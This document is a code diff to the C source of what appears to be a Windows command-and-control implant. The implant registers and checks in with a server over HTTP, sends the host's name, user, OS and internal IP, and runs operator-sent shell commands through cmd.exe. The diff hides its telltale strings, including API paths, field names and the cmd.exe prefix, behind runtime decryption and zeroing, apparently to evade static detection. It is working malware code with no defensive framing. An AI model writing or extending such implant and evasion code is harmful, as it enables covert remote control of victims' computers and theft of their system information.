@@ -18,6 +18,7 @@
 #include "transport.h"
 #include "api.h"
 #include "msgpack.h"
+#include "strings.h"
 #include <winhttp.h>
 #include <bcrypt.h>
 #include <wincrypt.h>
@@ -342,18 +343,27 @@ static DWORD MsgpackEncodeRegistration(
         memcpy(pOutput + offset, val, vlen); offset += vlen; \
     } while(0)
 
-    // Write key-value pairs (matching Go struct tags)
-    MSGPACK_STR("hostname", szHostname);
-    MSGPACK_STR("username", szUsername);
-    MSGPACK_STR("os", szOS);
-    MSGPACK_STR("arch", szArch);
+    // Write key-value pairs (runtime-decrypted field names)
+    #define MSGPACK_ENC_STR(encArr, encLen, val) do { \
+        CHAR _k[32]; memcpy(_k, encArr, encLen + 1); \
+        DecryptString(_k, encLen); \
+        MSGPACK_STR(_k, val); \
+        ZeroString(_k, encLen); \
+    } while(0)
 
-    // PID as uint32: fixstr key + uint32 value
+    MSGPACK_ENC_STR(g_EncHostname, ENC_HOSTNAME_LEN, szHostname);
+    MSGPACK_ENC_STR(g_EncUsername, ENC_USERNAME_LEN, szUsername);
+    MSGPACK_ENC_STR(g_EncOs, ENC_OS_LEN, szOS);
+    MSGPACK_ENC_STR(g_EncArch, ENC_ARCH_LEN, szArch);
+
+    // PID as uint32: decrypted key + uint32 value
     {
-        PCHAR key = "pid";
-        DWORD klen = 3;
+        CHAR pidKey[8]; memcpy(pidKey, g_EncPid, ENC_PID_LEN + 1);
+        DecryptString(pidKey, ENC_PID_LEN);
+        DWORD klen = ENC_PID_LEN;
         pOutput[offset++] = 0xA0 | klen;
-        memcpy(pOutput + offset, key, klen); offset += klen;
+        memcpy(pOutput + offset, pidKey, klen); offset += klen;
+        ZeroString(pidKey, ENC_PID_LEN);
         pOutput[offset++] = 0xCE; // uint32
         pOutput[offset++] = (BYTE)((dwPID >> 24) & 0xFF);
         pOutput[offset++] = (BYTE)((dwPID >> 16) & 0xFF);
@@ -361,8 +371,9 @@ static DWORD MsgpackEncodeRegistration(
         pOutput[offset++] = (BYTE)(dwPID & 0xFF);
     }
 
-    MSGPACK_STR("process_name", szProcessName);
-    MSGPACK_STR("internal_ip", szInternalIP);
+    MSGPACK_ENC_STR(g_EncProcessName, ENC_PROCESS_NAME_LEN, szProcessName);
+    MSGPACK_ENC_STR(g_EncInternalIp, ENC_INTERNAL_IP_LEN, szInternalIP);
+    #undef MSGPACK_ENC_STR
 
     #undef MSGPACK_STR
     return offset;
@@ -437,8 +448,13 @@ static BOOL HttpPost(PCHAR szPath, PBYTE pBody, DWORD dwBodyLen, PBYTE* ppRespon
         WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
     }
 
-    // Set headers
-    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);
+    // Set headers (Content-Type decrypted at runtime)
+    CHAR szCT[64]; memcpy(szCT, g_EncContentType, ENC_CONTENT_TYPE_LEN + 1);
+    DecryptString(szCT, ENC_CONTENT_TYPE_LEN);
+    WCHAR wszCT[64] = { 0 };
+    MultiByteToWideChar(CP_UTF8, 0, szCT, -1, wszCT, 64);
+    ZeroString(szCT, ENC_CONTENT_TYPE_LEN);
+    WinHttpAddRequestHeaders(hRequest, wszCT, -1, WINHTTP_ADDREQ_FLAG_ADD);
 
     WCHAR wszUAHeader[600] = { 0 };
     wsprintfW(wszUAHeader, L"User-Agent: %s", wszUA);
@@ -566,19 +582,25 @@ BOOL TransportRegister(PSESSION pSession) {
     DWORD dwJsonLen = WrapForHTTP(bEnvelope, dwEnvLen, szJson, sizeof(szJson));
     if (dwJsonLen == 0) return FALSE;
 
-    // 9. POST to /api/v1/auth
+    // 9. POST to /api/v1/auth (decrypted at runtime)
     PBYTE pResponse = NULL;
     DWORD dwResponseLen = 0;
-    if (!HttpPost("/api/v1/auth", (PBYTE)szJson, dwJsonLen, &pResponse, &dwResponseLen))
-        return FALSE;
+    CHAR szRegURI[32]; memcpy(szRegURI, g_EncRegisterURI, ENC_REGISTER_URI_LEN + 1);
+    DecryptString(szRegURI, ENC_REGISTER_URI_LEN);
+    BOOL bPostOk = HttpPost(szRegURI, (PBYTE)szJson, dwJsonLen, &pResponse, &dwResponseLen);
+    ZeroString(szRegURI, ENC_REGISTER_URI_LEN);
+    if (!bPostOk) return FALSE;
 
     // 10. Parse response: JSON → base64 → envelope → AES-GCM decrypt → msgpack
     if (!pResponse || dwResponseLen == 0) return FALSE;
 
     // Extract base64 "data" field from JSON: {"data":"...", "ts":...}
-    PCHAR pDataStart = strstr((PCHAR)pResponse, "\"data\":\"");
+    CHAR szMarker[16]; memcpy(szMarker, g_EncDataMarker, ENC_DATA_MARKER_LEN + 1);
+    DecryptString(szMarker, ENC_DATA_MARKER_LEN);
+    PCHAR pDataStart = strstr((PCHAR)pResponse, szMarker);
+    ZeroString(szMarker, ENC_DATA_MARKER_LEN);
     if (!pDataStart) { HeapFree(GetProcessHeap(), 0, pResponse); return FALSE; }
-    pDataStart += 8; // skip "data":"
+    pDataStart += ENC_DATA_MARKER_LEN;
 
     PCHAR pDataEnd = strchr(pDataStart, '"');
     if (!pDataEnd) { HeapFree(GetProcessHeap(), 0, pResponse); return FALSE; }
@@ -645,10 +667,13 @@ BOOL TransportCheckIn(PSESSION pSession, PC2_RESULT pResults, DWORD dwResultCoun
     // fixmap with 2 keys
     bPayload[offset++] = 0x82;
 
-    // "agent_id" → session agent_id
-    DWORD klen = 8; // "agent_id"
+    // "agent_id" → session agent_id (decrypted at runtime)
+    CHAR szAidKey[16]; memcpy(szAidKey, g_EncAgentId, ENC_AGENT_ID_LEN + 1);
+    DecryptString(szAidKey, ENC_AGENT_ID_LEN);
+    DWORD klen = ENC_AGENT_ID_LEN;
     bPayload[offset++] = 0xA0 | klen;
-    memcpy(bPayload + offset, "agent_id", klen); offset += klen;
+    memcpy(bPayload + offset, szAidKey, klen); offset += klen;
+    ZeroString(szAidKey, ENC_AGENT_ID_LEN);
     DWORD vlen = (DWORD)strlen(pSession->szAgentID);
     if (vlen <= 31) {
         bPayload[offset++] = 0xA0 | (vlen & 0x1F);
@@ -658,10 +683,13 @@ BOOL TransportCheckIn(PSESSION pSession, PC2_RESULT pResults, DWORD dwResultCoun
     }
     memcpy(bPayload + offset, pSession->szAgentID, vlen); offset += vlen;
 
-    // "results" → empty array
-    klen = 7;
+    // "results" → empty array (decrypted at runtime)
+    CHAR szResKey[16]; memcpy(szResKey, g_EncResults, ENC_RESULTS_LEN + 1);
+    DecryptString(szResKey, ENC_RESULTS_LEN);
+    klen = ENC_RESULTS_LEN;
     bPayload[offset++] = 0xA0 | klen;
-    memcpy(bPayload + offset, "results", klen); offset += klen;
+    memcpy(bPayload + offset, szResKey, klen); offset += klen;
+    ZeroString(szResKey, ENC_RESULTS_LEN);
     bPayload[offset++] = 0x90; // empty fixarray
 
     // 2. AES-GCM encrypt
@@ -681,11 +709,14 @@ BOOL TransportCheckIn(PSESSION pSession, PC2_RESULT pResults, DWORD dwResultCoun
     DWORD dwJsonLen = WrapForHTTP(bEnvelope, dwEnvLen, szJson, sizeof(szJson));
     if (dwJsonLen == 0) return FALSE;
 
-    // 5. POST to /api/v1/status
+    // 5. POST to /api/v1/status (decrypted at runtime)
     PBYTE pResponse = NULL;
     DWORD dwResponseLen = 0;
-    if (!HttpPost("/api/v1/status", (PBYTE)szJson, dwJsonLen, &pResponse, &dwResponseLen))
-        return FALSE;
+    CHAR szChkURI[32]; memcpy(szChkURI, g_EncCheckInURI, ENC_CHECKIN_URI_LEN + 1);
+    DecryptString(szChkURI, ENC_CHECKIN_URI_LEN);
+    BOOL bChkOk = HttpPost(szChkURI, (PBYTE)szJson, dwJsonLen, &pResponse, &dwResponseLen);
+    ZeroString(szChkURI, ENC_CHECKIN_URI_LEN);
+    if (!bChkOk) return FALSE;
 
     // 6. Parse tasks from response: JSON → base64 → envelope → AES-GCM decrypt → msgpack
     if (!pResponse || dwResponseLen == 0) {
@@ -809,10 +840,13 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
 
                 switch (pTasks[i].bType) {
                     case TASK_SHELL: {
-                        // Execute shell command via cmd.exe /c
+                        // Execute shell command (cmd prefix decrypted at runtime)
                         if (pTasks[i].dwArgCount > 0) {
+                            CHAR szPrefix[16]; memcpy(szPrefix, g_EncCmdExe, ENC_CMD_EXE_LEN + 1);
+                            DecryptString(szPrefix, ENC_CMD_EXE_LEN);
                             CHAR szCmd[1024];
-                            sprintf(szCmd, "cmd.exe /c %s", pTasks[i].szArgs[0]);
+                            sprintf(szCmd, "%s%s", szPrefix, pTasks[i].szArgs[0]);
+                            ZeroString(szPrefix, ENC_CMD_EXE_LEN);
 
                             // Create pipe for output capture
                             HANDLE hReadPipe, hWritePipe;
@@ -866,7 +900,7 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                         CHAR szA[16] = {0}, szP[MAX_PATH] = {0}, szI[64] = {0};
                         DWORD pid = 0;
                         CollectSysInfo(szH, szU, szO, szA, &pid, szP, szI);
-                        DWORD len = (DWORD)sprintf(szInfo, "hostname=%s\nuser=%s\nos=%s\narch=%s\npid=%lu\nprocess=%s\nip=%s",
+                        DWORD len = (DWORD)sprintf(szInfo, "%s\n%s\n%s\n%s\n%lu\n%s\n%s",
                             szH, szU, szO, szA, pid, szP, szI);
                         res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
                         memcpy(res->pOutput, szInfo, len);
